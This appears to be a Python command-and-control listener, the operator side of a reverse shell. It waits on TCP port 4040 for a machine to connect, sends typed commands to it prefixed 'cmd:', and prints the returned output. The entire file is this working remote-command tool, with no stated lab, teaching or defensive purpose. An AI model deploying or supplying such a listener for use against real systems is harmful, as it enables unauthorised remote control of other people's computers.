from socket import *

if __name__ == "__main__":
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind(('', 4040))
    serverSocket.listen(1)
    serverSocket.settimeout(9999)

    while True:
        print("Waiting for connection...")
        c, (client_host, client_port) = serverSocket.accept()
        print("Connected to "+client_host)
        while True:
            cmd = input('> ').lower()
            if cmd == "exit":
                print('sent')
                c.send(bytes('exit', encoding='utf8'))
                print(str(c.recv(1000), encoding='utf8'))
                break
            else:
                c.send(bytes(f'cmd:{cmd}', encoding='utf8'))
                if str(c.recv(1000), encoding='utf8') == "rec":
                    print('command recieved!')
                    out = str(c.recv(1000), encoding='utf8')
                    print(out)
        print("Connection closed\n")
        c.close()

